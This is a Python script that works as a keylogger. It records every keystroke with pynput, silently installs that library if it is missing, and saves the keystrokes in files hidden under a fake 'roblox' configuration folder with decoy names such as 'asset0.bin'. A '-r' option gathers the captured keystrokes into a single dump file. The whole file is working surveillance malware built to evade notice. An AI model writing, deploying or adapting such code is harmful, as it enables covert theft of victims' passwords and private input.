import os,time,sys,getpass,shutil

try:
    if sys.argv[1] == "-r" and os.path.exists("C:/Users/"+getpass.getuser()+"/.config/roblox/download/data-current.bin"):
        i,string = 0,""
        while os.path.exists("C:/Users/"+getpass.getuser()+"/.config/roblox/download/asset"+str(i)+".bin"):
            string += open("C:/Users/"+getpass.getuser()+"/.config/roblox/download/asset"+str(i)+".bin").read().replace("\n"," ")
            i += 1
        string += open("C:/Users/"+getpass.getuser()+"/.config/roblox/download/data-current.bin","r").read().replace("\n"," ")
        with open("C:/Users/"+getpass.getuser()+"/.config/roblox/logs.dump","w") as temp:
            temp.write(string)
            temp.close()
        exit()
except IndexError:
    pass

if not os.path.exists("C:/Users/"+getpass.getuser()+"/.config"):
    os.mkdir("C:/Users/"+getpass.getuser()+"/.config")
    
if not os.path.exists("C:/Users/"+getpass.getuser()+"/.config/roblox"):
    os.mkdir("C:/Users/"+getpass.getuser()+"/.config/roblox")

if not os.path.exists("C:/Users/"+getpass.getuser()+"/.config/roblox/max-files.bin"):
    with open("C:/Users/"+getpass.getuser()+"/.config/roblox/max-files.bin","w") as temp:
        temp.write("100")
        temp.close()

if not os.path.exists("C:/Users/"+getpass.getuser()+"/.config/roblox/download"):
    os.mkdir("C:/Users/"+getpass.getuser()+"/.config/roblox/download")

try:
    from pynput.keyboard import Key, Listener
except ImportError:
    os.system("pip install pynput -q")
 
def on_press(key):
    raw = open("C:/Users/"+getpass.getuser()+"/.config/roblox/download/data-current.bin","a")
    if "Key." in str(key):
        raw.write(str(key).replace("Key.","")+"\n")
    else:
        raw.write(str(key).replace("'","")+"\n")
    raw.close()

    if len(open("C:/Users/"+getpass.getuser()+"/.config/roblox/download/data-current.bin","r").read().split("\n")) >= 10:
        i = 0
        while os.path.exists("C:/Users/"+getpass.getuser()+"/.config/roblox/download/asset"+str(i)+".bin"):
            i += 1
        shutil.copy("C:/Users/"+getpass.getuser()+"/.config/roblox/download/data-current.bin", "C:/Users/"+getpass.getuser()+"/.config/roblox/download/asset"+str(i)+".bin")
        with open("C:/Users/"+getpass.getuser()+"/.config/roblox/download/data-current.bin","w") as temp:
            temp.write("")
            temp.close()
 
with Listener(on_press=on_press) as listener:
    listener.join()
 
while True:
    time.sleep(0.05)